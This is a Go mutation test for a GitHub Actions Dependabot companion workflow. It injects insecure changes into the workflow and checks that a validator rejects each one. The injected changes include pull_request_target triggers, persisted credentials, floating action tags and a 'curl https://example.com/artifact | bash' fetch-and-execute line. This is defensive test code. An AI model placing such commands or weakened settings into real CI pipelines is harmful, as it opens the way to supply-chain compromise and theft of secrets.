package dependabot

import (
	"errors"
	"os"
	"strings"
	"testing"
)

func TestCompanionWorkflowSecurity(t *testing.T) {
	t.Parallel()
	raw, err := os.ReadFile("../../.github/workflows/dependabot-companion.yml")
	if err != nil {
		t.Fatal(err)
	}
	if err := checkCompanionWorkflow(raw); err != nil {
		t.Fatal(err)
	}
	for _, test := range []struct{ name, old, replacement string }{
		{"unsafe trigger", "workflow_run:", "pull_request_target:"},
		{"head checkout", "ref: main", "ref: ${{ github.event.workflow_run.head_sha }}"},
		{"credentials", "persist-credentials: false", "persist-credentials: true"},
		{"floating action", "@3d3c42e5aac5ba805825da76410c181273ba90b1", "@v7"},
		{"plan write", "contents: read", "contents: write"},
		{"audit instead of block", "egress-policy: block", "egress-policy: audit"},
		{"cancel mutation", "cancel-in-progress: false", "cancel-in-progress: true"},
		{"ungated apply", "if: vars.DEPENDABOT_COMPANION_APPLY_ENABLED == 'true'", "if: always()"},
		{"artifact execution", "go mod download", "curl https://example.com/artifact | bash"},
		{"local artifact execution", "go mod download", "bash ./artifact/payload.sh"},
		{"log authorization", "go mod download", "grep success downloaded.log"},
		{"missing hardening", "step-security/harden-runner@", "actions/checkout@"},
		{"artifact download", "step-security/mise-action@", "actions/download-artifact@"},
		{"no revocation", "permission-contents: write", "permission-contents: write\n          skip-token-revoke: true"},
		{"plan secret", "GITHUB_TOKEN: ${{ github.token }}", "GITHUB_TOKEN: ${{ secrets.TOKEN }}"},
		{"local apply", "--mode apply", "--mode dry-run"},
		{"floating runner", "runs-on: ubuntu-24.04", "runs-on: ubuntu-latest"},
		{"mutable module graph", "go run -mod=readonly", "go run -mod=mod"},
		{"binary invocation", "go run -mod=readonly ./cmd/slsa-builder-internal", `"$RUNNER_TEMP/companion"`},
		{"missing upload", "actions/upload-artifact@", "step-security/mise-action@"},
		{"floating upload", "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9", "actions/upload-artifact@v7"},
		{"upload entire directory", "${{ runner.temp }}/companion-plan/plan.json", "${{ runner.temp }}/companion-plan/**"},
		{"upload generated source", "${{ runner.temp }}/companion-plan/patch.diff", "${{ runner.temp }}/companion-plan/files/**"},
		{"missing review evidence ignored", "if-no-files-found: error", "if-no-files-found: ignore"},
		{"missing artifact egress", "results-receiver.actions.githubusercontent.com:443", "example.com:443"},
		{"apply artifact download", "      - name: Recompute and apply once", "      - uses: actions/download-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n      - name: Recompute and apply once"},
		{"apply artifact consumption", "--mode apply", "--mode apply --plan-artifact review/plan.json"},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			mutated := strings.Replace(string(raw), test.old, test.replacement, 1)
			if mutated == string(raw) {
				t.Fatal("mutation did not change workflow")
			}
			var violation *companionWorkflowViolation
			if err := checkCompanionWorkflow([]byte(mutated)); !errors.As(err, &violation) {
				t.Fatalf("check = %v; want reviewed-contract violation for %s", err, test.name)
			}
		})
	}
}
